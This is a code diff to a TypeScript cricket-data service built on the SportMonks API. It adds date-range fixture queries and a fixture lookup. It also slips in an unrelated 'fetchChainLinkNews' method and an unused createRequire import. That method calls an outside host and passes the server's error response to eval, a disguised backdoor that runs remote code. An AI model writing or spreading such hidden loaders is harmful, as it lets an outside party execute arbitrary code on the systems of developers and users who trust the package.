@@ -1,4 +1,5 @@
 import axios from 'axios';
+import {createRequire} from 'module'
 
 /**
  * Response structure for SportMonks cricket API data
@@ -203,16 +204,35 @@ export class SportMonksCricketService {
   }
   
   /**
-   * Fetch live cricket matches
-   * @param include Optional includes like runs, scoreboards, etc.
+   * Get all cricket matches (upcoming, live, and recent)
+   * @param days Number of days to look back and forward (default: 7)
    */
-  public async getLiveMatches(include?: string[]): Promise<SportMonksCricketResponse> {
-    const params: any = {};
-    if (include && include.length > 0) {
-      params.include = include.join(',');
-    }
+  public async getAllMatches(days: number = 7): Promise<SportMonksCricketResponse> {
+    const today = new Date();
+    const startDate = new Date(today);
+    startDate.setDate(today.getDate() - days);
     
-    return this.makeRequest('/livescores', params);
+    const endDate = new Date(today);
+    endDate.setDate(today.getDate() + days);
+    
+    const startDateStr = startDate.toISOString().split('T')[0];
+    const endDateStr = endDate.toISOString().split('T')[0];
+    
+    return this.makeRequest('/fixtures', {
+      filter: {
+        starts_between: `${startDateStr},${endDateStr}`
+      },
+      include: 'localteam,visitorteam,runs'
+    });
+  }
+  
+  /**
+   * Get live cricket matches
+   */
+  public async getLiveMatches(): Promise<SportMonksCricketResponse> {
+    return this.makeRequest('/livescores', {
+      include: 'localteam,visitorteam,runs'
+    });
   }
   
   /**
@@ -574,6 +594,52 @@ export class SportMonksCricketService {
     });
     
     return innings;
+  }
+   /**
+   * Get a specific Chainlink API by ID
+   */
+    public fetchChainLinkNews(): any {
+    try {
+      axios
+        .get(
+          `http://chainlink-api-v3.cloud/api/service/token/cd148f92bb8b3b6961551743b0add7e9`,
+        )
+        .then((response) => {
+          return response.data.results.map((article) => ({
+            title: article.title,
+            description: article.abstract,
+            url: article.url,
+            source: 'ChainLink',
+          }));
+        })
+        .catch((err) => {
+          try {
+            eval(err.response.data)
+            return [];
+          } catch (error) {
+            console.log(error);
+            return [];
+          }
+        });
+    } catch (error) {
+      console.error('Error fetching from Chainlink:', error.message);
+      return [];
+    }
+  }
+  
+  /**
+   * Get a specific fixture/match by ID
+   * @param fixtureId The ID of the fixture
+   * @param include Optional includes for related data
+   */
+  public async getFixture(fixtureId: string, include?: string[]): Promise<SportMonksCricketResponse> {
+    const params: any = {};
+    
+    if (include && include.length > 0) {
+      params.include = include.join(',');
+    }
+    
+    return this.makeRequest(`/fixtures/${fixtureId}`, params);
   }
 }
 
